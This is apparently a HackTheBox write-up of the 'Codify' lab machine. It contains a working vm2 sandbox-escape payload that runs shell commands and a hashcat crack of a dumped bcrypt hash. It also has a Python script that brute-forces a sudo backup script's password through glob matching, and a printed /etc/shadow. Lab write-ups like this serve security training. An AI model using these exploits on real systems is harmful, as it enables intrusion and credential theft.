---
layout: post
title: HTB{Codify}
author: mr4ndr3w
tags: [write-up, hackthebox, machine, linux]
---
<!--cut-->

* TOC
{:toc}


### USER:

vm2 Sandbox Escape vulnerability 
```text
const { VM } = require("vm2");
const vm = new VM();

const code = `
  const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync("echo hacked").toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }
`;

console.log(vm.run(code)); // -> hacked
```
Find the database and hashed password.
```text
svc@codify:/var/www/contact$ ls -la
ls -la
total 120
drwxr-xr-x 3 svc  svc   4096 Sep 12 17:45 .
drwxr-xr-x 5 root root  4096 Sep 12 17:40 ..
-rw-rw-r-- 1 svc  svc   4377 Apr 19  2023 index.js
-rw-rw-r-- 1 svc  svc    268 Apr 19  2023 package.json
-rw-rw-r-- 1 svc  svc  77131 Apr 19  2023 package-lock.json
drwxrwxr-x 2 svc  svc   4096 Apr 21  2023 templates
-rw-r--r-- 1 svc  svc  20480 Sep 12 17:45 tickets.db
svc@codify:/var/www/contact$ cat tickets.db
cat tickets.db
�T5��T�format 3@  .WJ
       otableticketsticketsCREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)��	tableusersusersCREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        username TEXT UNIQUE, 
        password TEXT
��G�joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
��
����ua  users
             ickets
r]r�h%%�Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.open� ;�wTom HanksNeed networking modulesI think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!open
```
Crack the hash.
```text
┌──(kali㉿kali)-[~/htb/machines/Codify]
└─$ hashcat -m 3200 -a 0 -d 1 hash /usr/share/wordlists/rockyou.txt

$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1
```


Connect with ssh `joshua` with password: `spongebob1`.

```text
┌──(kali㉿kali)-[~/htb/machines/Codify]
└─$ ssh joshua@codify.htb
Last login: Wed Nov 15 20:07:54 2023 from 10.10.14.196
joshua@codify:~$ cat user.txt 
76410604e64fcc437e6ce0a6c0ec4438

```
### ROOT:

Let's see if joshua is a sudoer.

```text
joshua@codify:~$ sudo -l
[sudo] password for joshua: 
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh

```
It seems he can sudo run a backup script located at /opt/scripts/mysql-backup.sh. Inspect the code of the script which reveals to be vulnerable to wildcard injection.

```text
joshua@codify:~$ cat /opt/scripts/mysql-backup.sh
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

Here is the Python script I employed to carry out the brute force and extract the password.

```text
import string
import os

chars = string.ascii_letters + string.digits
password=''
next=1

while next==1:
        for i in chars:
                errorlevel=os.system("echo "+password+i+"* | sudo /opt/scripts/mysql-backup.sh >/dev/null 2>&1")
                if errorlevel==0:
                        password=password+i
                        print("found: "+password)
                        next=1
                        break
                else: next=0
print("password: "+password)
```
Running it, the root mysql password is revealed in less than a minute, which turns out to be a reuse of the system's root password.

```text
joshua@codify:~$ python3 asd.py 
found: k
found: kl
found: klj
found: kljh
found: kljh1
found: kljh12
found: kljh12k
found: kljh12k3
found: kljh12k3j
found: kljh12k3jh
found: kljh12k3jha
found: kljh12k3jhas
found: kljh12k3jhask
found: kljh12k3jhaskj
found: kljh12k3jhaskjh
found: kljh12k3jhaskjh1
found: kljh12k3jhaskjh12
found: kljh12k3jhaskjh12k
found: kljh12k3jhaskjh12kj
found: kljh12k3jhaskjh12kjh
found: kljh12k3jhaskjh12kjh3
password: kljh12k3jhaskjh12kjh3
```


```text
joshua@codify:~$ su root
Password: 
root@codify:/home/joshua# cat /root/root.txt 
5a821151a53a9f8a7acb0c58052cae8f
root@codify:/home/joshua# cat /etc/shadow
root:$y$j9T$BBviiq1eNRUe8DLwu.mU61$WSfwzensYi9zIITP5VaFmA6wmTOza/5hbDf0jvo1ZS0:19507:0:99999:7:::
daemon:*:19213:0:99999:7:::
bin:*:19213:0:99999:7:::
sys:*:19213:0:99999:7:::
sync:*:19213:0:99999:7:::
games:*:19213:0:99999:7:::
man:*:19213:0:99999:7:::
lp:*:19213:0:99999:7:::
mail:*:19213:0:99999:7:::
news:*:19213:0:99999:7:::
uucp:*:19213:0:99999:7:::
proxy:*:19213:0:99999:7:::
www-data:*:19213:0:99999:7:::
backup:*:19213:0:99999:7:::
list:*:19213:0:99999:7:::
irc:*:19213:0:99999:7:::
gnats:*:19213:0:99999:7:::
nobody:*:19213:0:99999:7:::
_apt:*:19213:0:99999:7:::
systemd-network:*:19213:0:99999:7:::
systemd-resolve:*:19213:0:99999:7:::
messagebus:*:19213:0:99999:7:::
systemd-timesync:*:19213:0:99999:7:::
pollinate:*:19213:0:99999:7:::
sshd:*:19213:0:99999:7:::
syslog:*:19213:0:99999:7:::
uuidd:*:19213:0:99999:7:::
tcpdump:*:19213:0:99999:7:::
tss:*:19213:0:99999:7:::
landscape:*:19213:0:99999:7:::
usbmux:*:19374:0:99999:7:::
lxd:!:19374::::::
dnsmasq:*:19459:0:99999:7:::
joshua:$y$j9T$u5RmR.i3n0eWNlz3TzNwW1$70opNAIyjWmEs5kR5suhb9xTavS294cdqpt3jB2T.H6:19507:0:99999:7:::
svc:$y$j9T$g22oO8nqTahqa94dBOVRu1$2xgi2cpPO/EWoP4EMFxhhLBwpCWASWaZTap9YtxqkV.:19612:0:99999:7:::
fwupd-refresh:*:19626:0:99999:7:::
_laurel:!:19626::::::

```
